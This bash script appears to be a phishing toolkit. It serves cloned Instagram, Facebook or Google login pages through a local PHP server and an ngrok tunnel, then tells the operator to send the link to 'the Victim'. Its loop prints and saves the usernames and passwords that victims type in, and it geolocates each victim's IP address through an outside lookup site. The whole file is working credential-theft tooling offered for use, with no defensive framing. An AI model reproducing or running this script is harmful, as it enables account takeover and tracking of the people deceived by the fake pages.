#!/bin/bash

trap 'printf "\n";stop;exit 1' 2

init() 
{

	if [[ -e sites/$page/usernames.txt ]]; then
		rm -rf sites/$page/usernames.txt
	fi

	printf "[*] Starting php server...\n"
	cd sites/$page && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
	sleep 1

	printf "[*] Starting ngrok server...\n"
	./ngrok http 3333 > /dev/null 2>&1 &
	sleep 5

	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	printf "[*] Send this link to the Victim: %s \n" $link
	search
}

credential_steal() 
{
	user=$(grep -o 'Account:.*' sites/$page/usernames.txt | cut -d " " -f2)
	IFS=$'\n'
	pass=$(grep -o 'Pass:.*' sites/$page/usernames.txt | cut -d ":" -f2)
	
	printf "[*] Username: %s\n" $user
	printf "[*] Password: %s\n" $pass
	
	cat sites/$page/usernames.txt >> sites/$page/saved.usernames.txt
	printf "[*] Saved:sites/%s/saved.usernames.txt\n" $page
	printf "\n"
	read -p $'[*] Do you want to try other attack (Y/N)? ' ch
	
	if [[ $ch == "y" || $ch == "Y" ]]; then
		clear
		stop
		menu

	else
		stop
		exit 1
	fi
}

get_ip() 
{
	touch sites/$page/saved.usernames.txt
	ip=$(grep -a 'IP:' sites/$page/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	ua=$(grep 'User-Agent:' sites/$page/ip.txt | cut -d '"' -f2)
	printf "[*] Victim IP: %s\n" $ip
	printf "[*] Saved: %s/saved.ip.txt\n" $page
	cat sites/$page/ip.txt >> sites/$page/saved.ip.txt

	if [[ -e iptracker.log ]]; then
		rm -rf iptracker.log
	fi

	IFS='\n'
	iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
	IFS=$'\n'
	continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
	printf "\n"

	country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
	if [[ $country != "" ]]; then
		printf "[*] IP Country: %s\n" $country
	fi
	##

	state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
	if [[ $state != "" ]]; then
		printf "[*] State: %s\n" $state
	fi
	##

	isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
	if [[ $isp != "" ]]; then
		printf "[*] ISP: %s\n" $isp
	fi
	##

	printf "\n"
	rm -rf iptracker.log
	printf "[*] Waiting for Credentials from Victim...\n"
}

stop() 
{
	php1=$(ps aux | grep -o "php" | head -n1)
	ngrok1=$(ps aux | grep -o "ngrok" | head -n1)
	ssh1=$(ps aux | grep -o "ssh" | head -n1)

	if [[ $php1 == *'php'* ]]; then
		pkill -f -2 php > /dev/null 2>&1
		killall -2 php > /dev/null 2>&1
	fi

	if [[ $ngrok1 == *'ngrok'* ]]; then
		pkill -f -2 ngrok > /dev/null 2>&1
		killall -2 ngrok > /dev/null 2>&1
	fi

	if [[ $ssh1 == *'ssh'* ]]; then
		pkill -f -2 ssh > /dev/null 2>&1
		killall ssh > /dev/null 2>&1
	fi
}

main_proc() 
{

	read -p $'\nStart Ngrok (Y/N)?    ' opt
	if [[ $opt == "y" || $opt == "Y" ]]; then
		init

	elif [[ $opt == "n" || $opt == "N" ]];then
		exit 1
	else
		printf "[!] Invalid option!\n"
		clear
		main_proc
	fi
}

search() 
{
	printf "\n"
	printf "[*] Waiting Credentials and IP details of Victim ! ! \n"
	while [ true ]; do
		if [[ -e "sites/$page/ip.txt" ]]; then
			printf "\n[*] IP Found!\n"
			get_ip
			rm -rf sites/$page/ip.txt
		fi

		if [[ -e "sites/$page/usernames.txt" ]]; then
			printf "\n[*] Credentials Found!\n"
			printf "Victim got PW3NED!!!! ;)\n"
			credential_steal
			rm -rf sites/$page/usernames.txt
		fi

	done 
}

menu() 
{
	command -v php > /dev/null 2>&1 || { echo >&2 "php not found! Exit..."; exit 1; }
	command -v curl > /dev/null 2>&1 || { echo >&2 "curl not found! Exit..."; exit 1; }
	
	printf "[01] Instagram \n"
	printf "[02] Facebook \n"
	printf "[03] Google \n"
	printf "[00] Exit \n"
	read -p $'\n[*] Choose an option: \t' opt

	if [[ $opt == 1 || $opt == 01 ]]; then
		page="instagram"
		main_proc

	elif [[ $opt == 2 || $opt == 02 ]]; then
		page="facebook"
		main_proc

	elif [[ $opt == 3 || $opt == 03 ]]; then
		page="google"
		main_proc

	elif [[ $opt == 0 || $opt == 00 ]]; then
		exit 1

	else
		printf "[!] Invalid option!\n"
		clear
		menu
	fi
}
menu